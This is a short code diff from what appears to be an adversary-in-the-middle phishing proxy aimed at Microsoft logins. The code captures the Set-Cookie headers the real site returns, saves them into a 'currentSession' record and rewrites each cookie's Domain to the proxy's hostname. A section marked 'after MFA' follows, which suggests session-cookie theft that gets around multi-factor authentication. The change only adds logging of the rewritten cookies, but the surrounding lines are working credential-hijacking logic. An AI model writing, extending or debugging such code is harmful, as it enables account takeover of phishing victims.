@@ -614,16 +614,16 @@ if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
 
         const proxyResponseCookie = proxyResponse.headers["set-cookie"];
 if (proxyResponseCookie) {
-    //  console.log(`[MICROSOFT SET-COOKIE] ...`);
     console.log('[ORIGINAL SET-COOKIE]', JSON.stringify(proxyResponseCookie));
     updateCurrentSessionCookies(proxyRequestOptions, proxyResponseCookie, proxyHostname, currentSession, proxyResponse.headers.date);
 
     // ---- REWRITE Set-Cookie DOMAIN FOR CLIENT ----
     const rewrittenCookies = proxyResponseCookie.map(cookie => {
-        // Replace Domain=... with Domain=proxyHostname
         return cookie.replace(/\bDomain\s*=\s*[^;]+/i, `Domain=${proxyHostname}`);
     });
     proxyResponse.headers["set-cookie"] = rewrittenCookies;
+    // 👇 Insert the log here
+    console.log('[REWRITTEN SET-COOKIE]', JSON.stringify(rewrittenCookies));
 }
 
 // ===== FINAL ALERT & REDIRECT (after MFA) =====
